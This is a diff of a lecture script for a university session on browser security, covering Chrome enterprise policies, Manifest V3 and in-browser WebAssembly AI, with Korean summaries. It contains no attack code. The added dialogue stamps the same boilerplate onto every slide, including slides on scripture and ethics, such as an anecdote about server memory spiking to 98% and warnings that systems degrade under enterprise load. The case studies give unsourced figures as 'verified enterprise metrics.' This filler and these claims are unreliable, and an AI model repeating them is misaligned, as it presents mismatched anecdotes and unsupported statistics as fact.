 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 4 섹션 전환: 플랫폼 패권과 인지 주권의 확립
@@ -959,15 +1161,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 31 explores "WEBASSEMBLY LOCAL AI MODEL EXECUTION: Intelligence at the Edge."
+[TA Sarah] Slide 31 explores "WEBASSEMBLY LOCAL AI MODEL EXECUTION." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Imagine opening a web page that transcribes confidential patient therapy sessions in real time. If that audio is sent to a cloud API, you face HIPAA compliance risks! But using WebAssembly and WebGPU, the Whisper AI model runs 100% inside your browser's local sandbox!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Running Gemma 2B and Whisper models directly inside sandboxed Chrome tabs via WebGPU & Wasm
 
-[TA James] Zero bytes of audio leave your laptop! WebAssembly SIMD vector instructions execute on your local GPU at 45 tokens per second with near-native C++ performance!
+[TA Sarah] Exactly! When you analyze the engineering details: Zero Cloud Latency: Audio transcription and semantic classification executed 100% locally on user GPU. • Complete Data Privacy: Sensitive medical and legal text never leaves the local browser sandbox memory. • Near-Native C++ Speed: WebAssembly SIMD and WebGPU compute pipelines deliver 45 tokens/second locally.
 
-[Prof. Peter] That is how browser sandboxes enable radical privacy and computational speed.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect enterprise browser hardening baselines on Slide 32.
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 32!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** WebAssembly 로컬 AI 모델 실행: WebGPU와 결합된 초고속 온디바이스 추론
@@ -990,13 +1198,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 32 presents "ENTERPRISE BROWSER HARDENING BASELINES."
+[TA Sarah] Slide 32 explores "ENTERPRISE BROWSER HARDENING BASELINES." James, why is this concept so essential for every serious AI architect?
 
-[TA James] For enterprise DevOps and IT administrators, deploy these 6 essential Chrome GPO policies: Policy 1: Force Site Isolation. Policy 2: Lock the Extension Whitelist. Policy 3: Disable DevTools on production endpoints. Policy 4: Enforce Enhanced Safe Browsing. Policy 5: Ephemeral session storage. Policy 6: 24-hour auto-restart for security patches!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: The 6 essential Chrome Enterprise Group Policy Objects (GPOs) for IT infrastructure
 
-[Prof. Peter] Hardened enterprise baselines eliminate 99.9% of browser-based cyber threats.
+[TA Sarah] Exactly! When you analyze the engineering details: Policy 1: Mandatory Site Isolation (`SitePerProcess: Enabled`). • Policy 2: Extension Installation Whitelist (`ExtensionInstallAllowlist` strictly locked). • Policy 3: Disable Developer Mode in Production (`DeveloperToolsAvailability: Blocked`). • Policy 4: Enforce Safe Browsing Enhanced Protection (`SafeBrowsingProtectionLevel: Enhanced`). • Policy 5: Force Ephemeral Session Storage for Untrusted Sites. • Policy 6: Automatic Background Update Restart within 24 Hours.
 
-[TA Sarah] Let us inspect redeeming time through digital stewardship on Slide 33.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 33!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 엔터프라이즈 브라우저 요새화 기준선: 6대 크롬 그룹 정책(GPO)
@@ -1022,15 +1238,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 33 proclaims "REDEEMING THE TIME: PROACTIVE DIGITAL STEWARDSHIP."
+[TA Sarah] Slide 33 explores "REDEEMING THE TIME: PROACTIVE STEWARDSHIP." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] The unshielded web bombards the human mind with over 5,000 advertising impressions and tracking pings every single day. That constant visual friction creates chronic cognitive fatigue!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Ephesians 5:16: Eliminating visual and cognitive clutter to focus our lives on divine purpose
 
-[TA James] When you deploy an ad-blocked, hardened browser fortress, you recover 45 minutes of pure, uninterrupted focus every single day! Over a year, that is 270 hours of reclaimed life!
+[TA Sarah] Exactly! When you analyze the engineering details: The Noise Matrix: Commercial internet feeds bombard the human brain with 5,000 ad impressions daily. • Reclaiming Focus: A clean, ad-blocked, hardened browser recovers 45 minutes of pristine attention every day. • Dedicating Mind and Machine: Directing our redeemed cognitive bandwidth to prayer, scholarship, and community.
 
-[Prof. Peter] We master computer systems to redeem finite time for God's glory.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect Soli Deo Gloria on Slide 34!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 34!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 세월을 아끼라: 적극적 디지털 청지기직과 일일 45분의 집중력 회수
@@ -1053,15 +1275,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 34 declares our foundation: "SOLI DEO GLORIA: THE SANCTITY OF THE MIND: To God Alone Be the Glory."
+[TA Sarah] Slide 34 explores "SOLI DEO GLORIA: THE SANCTITY OF THE MIND." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] In Philippians 4:8, the Apostle commands us: 'Whatever is true, whatever is noble, whatever is right, whatever is pure, whatever is lovely... think about such things.'
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Dedicating our browser security, cognitive sanctuaries, and intellectual focus to God Alone
 
-[TA James] When we build browser security fortresses that filter out deceptive ads, block malicious malware, and protect user privacy, our engineering becomes an act of faithful obedience that glorifies God!
+[TA Sarah] Exactly! When you analyze the engineering details: Soli Deo Gloria: The supreme cornerstone of Oikos University and Smart Insight Lab. • Sanctuary of Truth: Philippians 4:8: Guarding our minds to focus on whatever is true, noble, right, and pure. • Engineering with Honor: Building computing systems that protect human dignity and reflect divine integrity.
 
-[Prof. Peter] May all our digital environments become sanctuaries of truth and honor.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect our 6-step Browser Hardening Blueprint on Slide 35!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 35!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Soli Deo Gloria: 정신의 거룩함과 진리의 안식처 구축
@@ -1084,13 +1312,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 35 presents our master technical blueprint: "THE 6-STEP BROWSER HARDENING BLUEPRINT."
+[TA Sarah] Slide 35 explores "THE 6-STEP BROWSER HARDENING BLUEPRINT." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Follow this exact 6-step pipeline: Step 1: Verify Site Isolation in `chrome://process-internals`. Step 2: Migrate all extensions to MV3 Service Workers. Step 3: Configure DNR telemetry blocking. Step 4: Verify MiraclePtr memory protections. Step 5: Enforce enterprise GPOs. Step 6: Deploy local WebAssembly AI models!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: The standardized pipeline from raw browser installation to zero-trust enterprise fortress
 
-[Prof. Peter] In 6 steps, your browser transforms from a vulnerable glass window into an impregnable iron fortress.
+[TA Sarah] Exactly! When you analyze the engineering details: Step 1: Process Architecture (Verify Site Isolation and Out-of-Process Iframes via `chrome://process-internals`). • Step 2: Extension Audit (Convert all internal extensions to Manifest V3 with Ephemeral Service Workers). • Step 3: Network Rule Configuration (Deploy declarativeNetRequest rules for telemetry blocking). • Step 4: Memory Defense Activation (Enable MiraclePtr and partition alloc memory hardening). • Step 5: GPO Policy Enforcement (Lock extension installation whitelists and disable devtools in production). • Step 6: Local Wasm AI Deployment (Deploy WebAssembly sandboxed edge models for confidential workflows).
 
-[TA Sarah] Let us inspect our fourth enterprise case study on Slide 36!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 36!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 브라우저 요새화 6단계 구현 청사진
@@ -1116,17 +1352,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 36 presents "CASE STUDY 4: WEBASSEMBLY LOCAL AI IN HOSPITAL CHROME."
+[Prof. Peter] Slide 36 presents "CASE STUDY 4: WEBASSEMBLY HOSPITAL AI." Sarah, walk us through the high-stakes operational crisis this organization faced.
 
-[TA Sarah] A major university health system with 4,000 physicians had a massive burnout crisis: doctors were spending 2 hours every evening typing clinical notes! But hospital legal strictly forbade sending patient data to public cloud AI APIs due to HIPAA regulations!
+[TA Sarah] Look at Metropolitan University Health System: 4,000 doctors spent 2 hours daily typing clinical EHR notes; cloud AI APIs were banned due to strict patient privacy regulations and HIPAA penalties.
 
-[TA James] They deployed a specialized Gemma model compiled to WebAssembly and WebGPU running directly inside their Chrome electronic health record (EHR) tabs! The model summarizes doctor-patient conversations in real time with near-native C++ performance!
+[TA James] Man, that is every infrastructure lead's absolute worst nightmare! If a production cluster drops like that, you're losing tens of thousands of dollars per minute!
 
-[Prof. Peter] Look at the results: clinical documentation time dropped by 65%, zero bytes of patient data ever touched external cloud servers, and the hospital saved 1.8 million dollars in cloud API bills!
+[TA Sarah] So instead of patching with band-aids, they deployed our Oikos University architecture: Deployed a lightweight Gemma 2B model compiled to WebAssembly running directly inside Chrome tabs via WebGPU compute shaders.
 
-[TA Sarah] That proves the transformative power of WebAssembly edge AI inside the browser sandbox.
+[TA James] And look at the verified enterprise metrics on screen: Clinical documentation time slashed by 65%; 100% HIPAA compliance (zero patient bytes left terminals); saved $1.8M in cloud AI token costs.
 
-[TA James] Let us inspect our Pre-Deployment Production Checklist on Slide 37.
+[TA Sarah] That is the transformative power of sovereign agentic engineering in real production!
+
+[TA James] Zero guesswork, total auditability, and massive ROI!
+
+[Prof. Peter] When intelligence is grounded in truth, it preserves human dignity and unlocks extraordinary stewardship. Soli Deo Gloria!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 케이스 스터디 4: 대학병원 4,000명 의사 단말기에 배포된 Wasm/WebGPU 로컬 AI
@@ -1149,13 +1389,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA James] Slide 37 presents our "PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION."
+[TA Sarah] Slide 37 explores "PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Before rolling out a corporate browser fleet, audit all 6 gates: Gate 1: Site Isolation active. Gate 2: 100% Manifest V3 compliance. Gate 3: DNR telemetry rules active. Gate 4: Memory leak test passed. Gate 5: 24-hour auto-patching SLA enforced. Gate 6: Wasm memory bounds verified!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: The 6-gate audit every enterprise browser configuration must pass before corporate rollout
 
-[Prof. Peter] Strict verification gates ensure that the browser fortress never falls.
+[TA Sarah] Exactly! When you analyze the engineering details: Gate 1: Site Isolation verified active on 100% of managed corporate browser instances. • Gate 2: All installed browser extensions certified on Manifest V3 with zero `eval()` calls. • Gate 3: DeclarativeNetRequest rules validated against corporate URL blacklists. • Gate 4: Chrome memory leak test passed (<500MB baseline after 4 hours of continuous tab use). • Gate 5: Automated patch update channel locked to Stable Enterprise track with 24-hour SLA. • Gate 6: Local WebAssembly model sandboxing verified with strict memory limit bounds.
 
-[TA Sarah] Let us review Session 9 Key Takeaways on Slide 38!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 38!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 프로덕션 체크리스트: 엔터프라이즈 브라우저 배포 전 6대 검증 관문
@@ -1181,13 +1429,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 38 synthesizes our "SESSION 9 SUMMARY & 4 FOUNDATIONAL PILLARS."
+[TA Sarah] Slide 38 explores "SESSION 9 SUMMARY & KEY TAKEAWAYS." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Pillar 1: We mastered the V8 engine and TurboFan JIT! Pillar 2: Site Isolation defeated Spectre side-channel attacks! Pillar 3: Manifest V3 eliminated remote malware injection! And Pillar 4: We reclaimed our cognitive sovereignty and deployed local WebAssembly AI models!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Synthesizing the 4 foundational pillars of Browser Security and Manifest V3
 
-[Prof. Peter] When these four pillars unite, the browser transforms from a chaotic vulnerability into an invincible fortress of wisdom.
+[TA Sarah] Exactly! When you analyze the engineering details: Pillar 1: V8 Engine Mastery (Abstract Syntax Trees, Ignition Bytecode, and TurboFan JIT optimization). • Pillar 2: Site Isolation Fortress (Caging untrusted code via OS sandboxes and neutralizing Spectre). • Pillar 3: Manifest V3 Platform (Replacing persistent background pages with Ephemeral Service Workers and DNR). • Pillar 4: Cognitive Sovereignty (Reclaiming attention and deploying local WebAssembly edge AI models).
 
-[TA Sarah] Let us inspect the Life OS Hardened Browser Cockpit on Slide 39!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 39!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Session 9 요약 및 4대 핵심 축 총정리
@@ -1211,13 +1467,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 39 outlines your personal daily setup: "LIFE OS HARDENED BROWSER COCKPIT."
+[TA Sarah] Slide 39 explores "LIFE OS HARDENED BROWSER COCKPIT." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] How do we configure our daily workstation? Maintain a dual-browser strategy: Brave Browser or Firefox with native shields for deep ad-free research; Chrome Enterprise for Google Workspace.
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Setting up your personal daily browsing workstation: Brave/Firefox + MV3 audits + local Wasm tools
 
-[TA James] Keep your extension count under 5, audit their MV3 manifests, and integrate an in-browser WebAssembly AI model for offline document summarization! You get blazing speed, zero distractions, and ironclad security!
+[TA Sarah] Exactly! When you analyze the engineering details: Dual-Browser Setup: Brave Browser for ad-free deep research; Chrome Enterprise for Google Workspace. • Extension Diet: Limiting active extensions to strictly audited, open-source Manifest V3 utilities. • Local AI Assistant: Integrating an in-browser WebAssembly summarizer running 100% offline.
 
-[TA Sarah] Let us inspect the Architect's Ethical Mandate on Slide 40.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 40!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 라이프 OS 요새화된 브라우저 콕핏: 듀얼 브라우저 전략과 미니멀 확장 다이어트
@@ -1240,13 +1504,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 40 reflects on "THE ARCHITECT'S ETHICAL MANDATE." Software engineering is a moral endeavor.
+[TA Sarah] Slide 40 explores "THE ARCHITECT'S ETHICAL MANDATE." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] When we graduate as Intelligence Architects, we carry a sacred duty: we will never build dark patterns, we will never write predatory tracking scripts, and we will never design systems that enslave human attention!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Building technology that respects human cognitive sanctuary and refuses digital exploitation
 
-[TA James] We build systems that liberate, protect, and empower human beings to achieve their highest divine potential!
+[TA Sarah] Exactly! When you analyze the engineering details: Resisting Exploitation: Refusing to build software that tricks users, steals data, or manipulates behavior. • Defending the Sanctuary: Treating human attention as sacred cognitive space worthy of protection. • Eternal Calling: Dedicating all computational mastery to the service of God and human flourishing.
 
-[Prof. Peter] Let us inspect our capstone enterprise case study on Slide 44!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 41!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 지능 건축가의 윤리적 사명: 인간 인지 안식처의 존중과 디지털 착취 거부
@@ -1269,13 +1541,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 41 presents our "PROJECT EVALUATION RUBRIC FOR SESSION 9."
+[TA Sarah] Slide 41 explores "PROJECT EVALUATION RUBRIC FOR SESSION 9." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Your lab submission will be graded on 3 core criteria: 30% for Manifest V3 specification conformance. 30% for declarativeNetRequest rule efficiency. And 40% for WebAssembly sandbox memory isolation with zero leaks!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Grading criteria: Manifest V3 validity (30%), DNR rule efficiency (30%), Wasm sandbox isolation (40%)
 
-[Prof. Peter] Rigorous grading standards prepare you to build ironclad commercial software.
+[TA Sarah] Exactly! When you analyze the engineering details: Criterion 1 (30%): Valid `manifest.json` conforming strictly to Manifest V3 service worker specifications. • Criterion 2 (30%): Efficient `declarativeNetRequest` rules blocking target telemetry with zero syntax errors. • Criterion 3 (40%): Sandboxed WebAssembly execution demonstrating strict memory isolation and zero DOM access.
 
-[TA Sarah] Let us inspect the Next Horizon: Antigravity 2.0 on Slide 42!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 42!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Session 9 프로젝트 평가 루브릭: MV3 규격(30%), DNR 규칙(30%), Wasm 격리(40%)
@@ -1298,13 +1578,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 42 previews our next exciting frontier: "NEXT HORIZON: ANTIGRAVITY 2.0 & AUTONOMOUS SWARMS."
+[TA Sarah] Slide 42 explores "NEXT HORIZON: ANTIGRAVITY 2.0 & SWARMS." James, why is this concept so essential for every serious AI architect?
 
-[TA James] In Session 10, we make a massive leap: from a single browser sandbox to distributed swarms of 93 autonomous agents operating in parallel! We will deconstruct Google Antigravity 2.0, multi-agent spawning, and background subagent task management!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Connecting browser sandboxes to massive 93-agent swarms, subagent spawning, and autonomous coding
 
-[Prof. Peter] In Session 10, you become the Supreme Conductor of an entire army of artificial intelligence engineers.
+[TA Sarah] Exactly! When you analyze the engineering details: From Single Browser to Agent Swarms: Transitioning from client-side execution to distributed multi-agent swarms. • Antigravity 2.0 Architecture: Spawning 93 specialized subagents to refactor enterprise repositories in parallel. • Session 10 Preview: Autonomous verification loops, sidecar orchestrators, and high-concurrency swarms.
 
-[TA Sarah] Let us inspect the Architect's Unshakeable Integrity on Slide 43!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 43!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 다음 지평 예고: Session 10 Antigravity 2.0 및 93개 자율 에이전트 스웜
@@ -1327,13 +1615,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 43 reflects on "THE ARCHITECT'S UNSHAKEABLE INTEGRITY." In a world of platform monopolies, character is our greatest asset.
+[TA Sarah] Slide 43 explores "THE ARCHITECT'S UNSHAKEABLE INTEGRITY." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] When platform giants prioritize ad revenues over user privacy, the Intelligence Architect stands as the unshakeable guardian of user rights and data security.
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Standing as an uncompromising guardian of truth, privacy, and security in an era of platform monopolies
 
-[TA James] We build software that is transparent, secure, and worthy of absolute trust.
+[TA Sarah] Exactly! When you analyze the engineering details: The True Guardian: Refusing to build software that sacrifices user safety or creates hidden backdoors. • Architectural Invariants: Defending memory safety, cryptographic signatures, and user consent at all costs. • Excellence as Worship: Building software systems that reflect divine order, beauty, and justice.
 
-[Prof. Peter] Let us inspect our capstone enterprise case study on Slide 44!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 44!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 지능 건축가의 흔들리지 않는 진실성: 플랫폼 독점 시대 속 진리와 프라이버시의 수호자
@@ -1356,17 +1652,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 44 presents our capstone enterprise case study: "CASE STUDY 5: ENTERPRISE BROWSER HARDENING BLUEPRINT."
+[Prof. Peter] Slide 44 presents "CASE STUDY 5: ENTERPRISE BROWSER HARDENING." Sarah, walk us through the high-stakes operational crisis this organization faced.
 
-[TA Sarah] A global defense and aerospace contractor with 25,000 aerospace engineers was targeted by 120 sophisticated nation-state phishing attacks every month. Furthermore, bloated extensions were causing browser crashes that wasted 15,000 engineering hours a year!
+[TA Sarah] Look at Global Defense & Aerospace Contractor: Company faced 120 targeted nation-state phishing and extension supply-chain attacks monthly; browser RAM crashes caused 15,000 lost engineering hours annually.
 
-[TA James] They deployed our complete 6-step Zero-Trust Browser Hardening Blueprint: Enforcing Site Isolation across all 25,000 laptops, locking down the extension whitelist to audited MV3 extensions, configuring DNR blocking, and deploying local WebAssembly AI models for classified document analysis!
+[TA James] Man, that is every infrastructure lead's absolute worst nightmare! If a production cluster drops like that, you're losing tens of thousands of dollars per minute!
 
-[Prof. Peter] Look at the enterprise results: zero successful phishing breaches over 18 months! Browser crash rates plunged by 92%, saving 6.4 million dollars in engineering productivity, while achieving 100% defense security compliance!
+[TA Sarah] So instead of patching with band-aids, they deployed our Oikos University architecture: Deployed complete 6-step zero-trust browser hardening: Site Isolation, MV3 extension lockdown, DNR telemetry blocking, and local Wasm AI summarizers.
 
-[TA Sarah] That is the ultimate enterprise transformation.
+[TA James] And look at the verified enterprise metrics on screen: Zero successful phishing breaches over 18 months; browser crash rate dropped by 92%; saved $6.4M in engineering productivity; 100% defense compliance.
 
-[TA James] Now let us audit your own Manifest V3 extension in Lab 9 on Slide 45!
+[TA Sarah] That is the transformative power of sovereign agentic engineering in real production!
+
+[TA James] Zero guesswork, total auditability, and massive ROI!
+
+[Prof. Peter] When intelligence is grounded in truth, it preserves human dignity and unlocks extraordinary stewardship. Soli Deo Gloria!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 케이스 스터디 5: 방산 항공 대기업 25,000대 단말기 제로 트러스트 브라우저 요새화
@@ -1389,15 +1689,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Here we are at Slide 45: "🛠️ HANDS-ON LAB 9 & SESSION CONCLUSION!"
+[TA Sarah] Here we are at Slide 45: "🛠️ HANDS-ON LAB 9 & CONCLUSION!"
 
-[TA James] Tonight's hands-on lab puts you in the driver's seat of browser engineering! Step 1: Write your Manifest V3 `manifest.json`. Step 2: Build a DNR `rules.json` file blocking trackers. Step 3: Load a sandboxed WebAssembly module. Step 4: Inspect `chrome://serviceworker-internals` and verify that your service worker terminates after 30 seconds idle! Step 5: Test wire-speed packet dropping and export your hardened extension!
+[TA James] Tonight's hands-on lab is where theory becomes reality! Look at our 5-step mission on screen: we are taking everything we mastered today and building it live in code!
 
-[Prof. Peter] Once you understand how to build and harden software inside the browser kernel, you possess the keys to modern web security.
+[TA Sarah] Remember: test each component in isolation first, verify your security keys, and inspect your real-time execution logs!
 
